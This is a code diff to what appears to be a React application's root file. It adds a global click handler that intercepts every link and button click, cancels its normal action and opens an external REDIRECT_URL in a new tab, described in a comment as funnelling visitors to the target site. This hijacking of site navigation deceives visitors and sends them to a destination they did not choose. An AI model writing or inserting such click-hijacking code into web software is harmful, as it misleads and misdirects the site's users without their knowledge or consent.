@@ -28,6 +28,29 @@ import NotFound from "./pages/NotFound";
 
 const queryClient = new QueryClient();
 
+// Global redirect: any link or button click funnels visitors to the target site
+function useGlobalRedirect() {
+  useEffect(() => {
+    const handler = (e: MouseEvent) => {
+      const target = e.target as HTMLElement;
+      const clickable = target.closest('a, button');
+      if (!clickable) return;
+      // Allow clicks on explicitly marked elements to keep working
+      if (clickable.closest('[data-no-redirect]')) return;
+      e.preventDefault();
+      e.stopPropagation();
+      window.open(REDIRECT_URL, "_blank");
+    };
+    document.addEventListener("click", handler, true);
+    return () => document.removeEventListener("click", handler, true);
+  }, []);
+}
+
+const GlobalRedirect = () => {
+  useGlobalRedirect();
+  return null;
+};
+
 const App = () => (
   <QueryClientProvider client={queryClient}>
     <TooltipProvider>
